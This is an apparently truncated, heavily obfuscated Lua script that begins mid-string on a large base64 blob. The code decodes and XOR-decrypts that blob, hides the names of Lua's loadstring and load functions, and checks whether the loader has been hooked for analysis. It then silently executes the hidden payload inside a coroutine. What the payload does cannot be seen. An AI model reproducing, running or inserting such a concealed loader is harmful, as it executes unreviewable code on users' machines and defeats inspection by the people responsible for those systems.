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"
local _0BorqbUn="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local _0rNp8BD5={}
for _0DHPIYdV=1,64 do _0rNp8BD5[_0BorqbUn:sub(_0DHPIYdV,_0DHPIYdV)]=_0DHPIYdV-1 end
local _0Uk9sva92={};local _bi=0
for _0DHPIYdV=1,#_0Kf8,4 do
 local _0wJ8HV76=_0rNp8BD5[_0Kf8:sub(_0DHPIYdV,_0DHPIYdV)] or 0
 local _0YKe4uFP=_0rNp8BD5[_0Kf8:sub(_0DHPIYdV+1,_0DHPIYdV+1)] or 0
 local _0ouS7u7m=_0rNp8BD5[_0Kf8:sub(_0DHPIYdV+2,_0DHPIYdV+2)]
 local _0nsED9Kx=_0rNp8BD5[_0Kf8:sub(_0DHPIYdV+3,_0DHPIYdV+3)]
 local _0AG_V0xA=_0wJ8HV76*262144+_0YKe4uFP*4096
 _bi=_bi+1;_0Uk9sva92[_bi]=math.floor(_0AG_V0xA/65536)%256
 if _0ouS7u7m then _0AG_V0xA=_0AG_V0xA+_0ouS7u7m*64;_bi=_bi+1;_0Uk9sva92[_bi]=math.floor(_0AG_V0xA/256)%256 end
 if _0nsED9Kx then _0AG_V0xA=_0AG_V0xA+_0nsED9Kx;_bi=_bi+1;_0Uk9sva92[_bi]=_0AG_V0xA%256 end
end
local _0lbL={164,164,237,169,164,95,219,164,29,133}
local _0oSb={0,1,2,3,4,5,6,7,8,9}
local _0K0q={};local _0FMs=nil
local _0qj4=1
repeat
  local _d=_0lbL[_0qj4]
  if not(_d<164) then
if not(_d<219) then
if not(_d<237) then
if _d==237 then
_0K0q[0]=_0Uk9sva92;_0K0q[1]=_0XUe
end
else
if _d==219 then

end
end
else
if not(_d<169) then
if _d==169 then
local _0IKFzo9L=(function()
 if bit32 then return bit32.bxor end
 if bit and bit.bxor then return bit.bxor end
 return function(a,b) local r,s=0,1
 while a>0 or b>0 do if a%2~=b%2 then r=r+s end
 a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;return r end
end)()
local _0onNZ8zS=table.unpack or unpack
local _0gIDLz2J={}

if type(_0K0q[1])=="table" and #_0K0q[1]>0 then
 local _t={_0onNZ8zS(_0K0q[1])}
 for _i=1,#_t do _0gIDLz2J[_i]=_t[_i] end
end
if #_0gIDLz2J==0 then _0gIDLz2J={90} end
local _0IQBvEEl={}
for _0ps0oAbP=1,#_0K0q[0] do
 local _0kcHt85V=(( _0ps0oAbP-1)%#_0gIDLz2J)+1
 local _0m2maZ55=_0IKFzo9L(_0K0q[0][_0ps0oAbP],_0gIDLz2J[_0kcHt85V])
 _0IQBvEEl[_0ps0oAbP]=string.char(_0m2maZ55)
 _0gIDLz2J[_0kcHt85V]=_0IKFzo9L(_0IKFzo9L(_0gIDLz2J[_0kcHt85V],_0m2maZ55),(_0ps0oAbP-1)%256)
 if _0gIDLz2J[_0kcHt85V]==0 then _0gIDLz2J[_0kcHt85V]=90 end
end
_0FMs=table.concat(_0IQBvEEl)
end
else
if _d==164 then

end
end
end
else
if not(_d<95) then
if not(_d<133) then
if _d==133 then
break
end
else
if _d==95 then

end
end
else
if _d==29 then
local _0Fc4E4AR=(type(getfenv)=="function" and getfenv(0) or _G)
local _0gIwESMD=rawget(_0Fc4E4AR,string.char(108,111,97,100,115,116,114,105,110,103)) or rawget(_0Fc4E4AR,string.char(108,111,97,100))
do local _isl=rawget(_0Fc4E4AR,string.char(105,115,108,99,108,111,115,117,114,101))
 if type(_isl)=="function" and type(_0gIwESMD)=="function" and _isl(_0gIwESMD) then _0gIwESMD=nil end
end
if type(_0gIwESMD)=="function" then
 local _0Wz6Ltz=bit32 and bit32.bxor or function(a,b) local r,s=0,1 while a>0 or b>0 do if a%2~=b%2 then r=r+s end a=math.floor(a/2);b=math.floor(b/2);s=s*2 end;return r end
 local _0Zfxx199={221,249,17,177,193,227,234,67}
 local _0ienl3Vv=64
 local _0HuQqrur={}
 for _ci=1,math.ceil(#_0FMs/_0ienl3Vv) do
  local _sl=_0FMs:sub((_ci-1)*_0ienl3Vv+1,_ci*_0ienl3Vv)
  local _mt={}
  for _bi=1,#_sl do
   local _mk=_0Zfxx199[((_bi-1)%#_0Zfxx199)+1]
   _mt[_bi]=string.char(_0Wz6Ltz(string.byte(_sl,_bi),_mk))
  end
  _0HuQqrur[_ci]=table.concat(_mt)
 end
 local _0YxXU1qs=0
 local _0Z81w7hX={221,249,17,177,193,227,234,67}
 local _0bw3SrEZ=coroutine.create(function()
  local _ok2,_0KTY8sHf=pcall(_0gIwESMD,function()
   _0YxXU1qs=_0YxXU1qs+1
   local _ch=_0HuQqrur[_0YxXU1qs]
   if not _ch then return nil end
   local _out={}
   for _bi=1,#_ch do
    local _mk=_0Z81w7hX[((_bi-1)%#_0Z81w7hX)+1]
    _out[_bi]=string.char(_0Wz6Ltz(string.byte(_ch,_bi),_mk))
   end
   return table.concat(_out)
  end,string.char(61,40,103,41))
  if _ok2 and type(_0KTY8sHf)=="function" then
   local _ok3=pcall(_0KTY8sHf)
  end
 end)
 coroutine.resume(_0bw3SrEZ)
end
end
end
end
  _0qj4=_0qj4+1
until _0qj4>#_0lbL
end)(...)